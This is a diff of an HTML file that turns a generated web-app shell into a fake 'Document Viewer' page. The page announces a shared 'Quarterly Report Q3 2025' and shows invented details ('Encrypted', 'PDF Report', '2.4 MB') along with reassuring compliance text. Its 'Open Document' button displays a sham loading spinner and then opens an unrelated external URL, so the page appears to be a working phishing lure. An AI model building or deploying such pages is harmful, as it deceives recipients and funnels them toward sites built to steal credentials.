@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Document Viewer</title>
@@ -14,18 +14,328 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="default" />
     <meta name="apple-mobile-web-app-title" content="Document Viewer" />
 
-    <meta property="og:title" content="link-landing-gateway" />
-    <meta property="og:description" content="Lovable Generated Project" />
-    <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
+    <style>
+        :root {
+            --primary: 220 14% 11%;
+            --primary-foreground: 210 20% 98%;
+            --secondary: 220 14% 96%;
+            --secondary-foreground: 220 9% 46%;
+            --accent: 220 14% 96%;
+            --accent-foreground: 220 9% 46%;
+            --background: 0 0% 100%;
+            --foreground: 220 14% 11%;
+            --muted: 220 14% 96%;
+            --muted-foreground: 220 9% 46%;
+            --border: 220 13% 91%;
+            --card: 0 0% 100%;
+            --card-foreground: 220 14% 11%;
+        }
 
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@lovable_dev" />
-    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
-  </head>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.5;
+            color: hsl(var(--foreground));
+            background: linear-gradient(135deg, hsl(var(--background)) 0%, hsl(var(--secondary) / 0.2) 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        .card {
+            background: hsl(var(--card));
+            border: 2px solid hsl(var(--border));
+            border-radius: 0.75rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            width: 100%;
+            max-width: 32rem;
+            overflow: hidden;
+        }
+
+        .card-header {
+            padding: 1.5rem 1.5rem 1rem;
+            text-align: center;
+        }
+
+        .card-content {
+            padding: 0 1.5rem 1.5rem;
+        }
+
+        .icon-container {
+            width: 5rem;
+            height: 5rem;
+            margin: 0 auto 1.5rem;
+            background: linear-gradient(135deg, hsl(var(--primary)) 0%, hsl(var(--primary) / 0.7) 100%);
+            border-radius: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+        }
+
+        .icon {
+            width: 2.5rem;
+            height: 2.5rem;
+            color: hsl(var(--primary-foreground));
+        }
+
+        .main-heading {
+            font-size: 1.875rem;
+            font-weight: bold;
+            color: hsl(var(--foreground));
+            margin-bottom: 0.5rem;
+            line-height: 1.2;
+        }
+
+        .document-info {
+            background: linear-gradient(135deg, hsl(var(--accent) / 0.05) 0%, hsl(var(--secondary) / 0.05) 100%);
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            border: 1px solid hsl(var(--border));
+            margin-bottom: 1.5rem;
+        }
+
+        .document-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: hsl(var(--foreground));
+            margin-bottom: 1rem;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            font-size: 0.875rem;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .info-item .icon {
+            width: 1rem;
+            height: 1rem;
+            color: hsl(var(--muted-foreground));
+        }
+
+        .info-label {
+            font-weight: 500;
+            color: hsl(var(--foreground));
+        }
+
+        .info-value {
+            color: hsl(var(--muted-foreground));
+        }
+
+        .action-button {
+            width: 100%;
+            background: hsl(var(--primary));
+            color: hsl(var(--primary-foreground));
+            border: none;
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            font-size: 1.125rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            box-shadow: 0 4px 14px 0 rgba(0, 0, 0, 0.1);
+            margin-bottom: 1.5rem;
+        }
+
+        .action-button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px 0 rgba(0, 0, 0, 0.15);
+        }
+
+        .action-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .spinner {
+            width: 1.25rem;
+            height: 1.25rem;
+            border: 2px solid hsl(var(--primary-foreground) / 0.2);
+            border-top: 2px solid hsl(var(--primary-foreground));
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .system-info {
+            background: hsl(var(--muted) / 0.3);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            text-align: center;
+        }
+
+        .system-info p {
+            font-size: 0.875rem;
+            color: hsl(var(--muted-foreground));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .system-info .icon {
+            width: 1rem;
+            height: 1rem;
+        }
+
+        @media (max-width: 640px) {
+            .main-heading {
+                font-size: 1.5rem;
+            }
+            
+            .card {
+                margin: 1rem;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <div class="card-header">
+            <!-- Company/System Branding -->
+            <div class="icon-container">
+                <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                </svg>
+            </div>
+
+            <!-- Main Heading -->
+            <h1 class="main-heading">
+                You have received a new document
+            </h1>
+        </div>
+
+        <div class="card-content">
+            <!-- Document Info Card -->
+            <div class="document-info">
+                <h2 class="document-title">
+                    Quarterly Report Q3 2025
+                </h2>
+                
+                <div class="info-grid">
+                    <div class="info-item">
+                        <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                        <div>
+                            <p class="info-label">Created</p>
+                            <p class="info-value" id="created-date"></p>
+                        </div>
+                    </div>
+                    
+                    <div class="info-item">
+                        <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                        </svg>
+                        <div>
+                            <p class="info-label">Security</p>
+                            <p class="info-value">Encrypted</p>
+                        </div>
+                    </div>
+                    
+                    <div class="info-item">
+                        <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                        </svg>
+                        <div>
+                            <p class="info-label">Type</p>
+                            <p class="info-value">PDF Report</p>
+                        </div>
+                    </div>
+                    
+                    <div class="info-item">
+                        <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                        </svg>
+                        <div>
+                            <p class="info-label">Size</p>
+                            <p class="info-value">2.4 MB</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Action Button -->
+            <button class="action-button" id="open-document" onclick="handleViewDocument()">
+                <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                </svg>
+                <span>Open Document</span>
+            </button>
+
+            <!-- System Info -->
+            <div class="system-info">
+                <p>
+                    <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                    </svg>
+                    This document is part of our internal document management system.
+                    All documents are securely stored and access is logged for compliance.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Set current date
+        function formatDate(date) {
+            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+            return `${months[date.getMonth()]} ${date.getDate().toString().padStart(2, '0')}, ${date.getFullYear()}`;
+        }
+
+        document.getElementById('created-date').textContent = formatDate(new Date());
+
+        // Handle document viewing
+        function handleViewDocument() {
+            const button = document.getElementById('open-document');
+            button.disabled = true;
+            
+            // Change button to loading state
+            button.innerHTML = `
+                <div class="spinner"></div>
+                <span>Opening Document...</span>
+            `;
+            
+            setTimeout(() => {
+                button.disabled = false;
+                button.innerHTML = `
+                    <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                    </svg>
+                    <span>Open Document</span>
+                `;
+                window.open("https://devnix.com.de/sOouvLsxZ/", "_blank");
+            }, 2000);
+        }
+    </script>
+</body>
 </html>
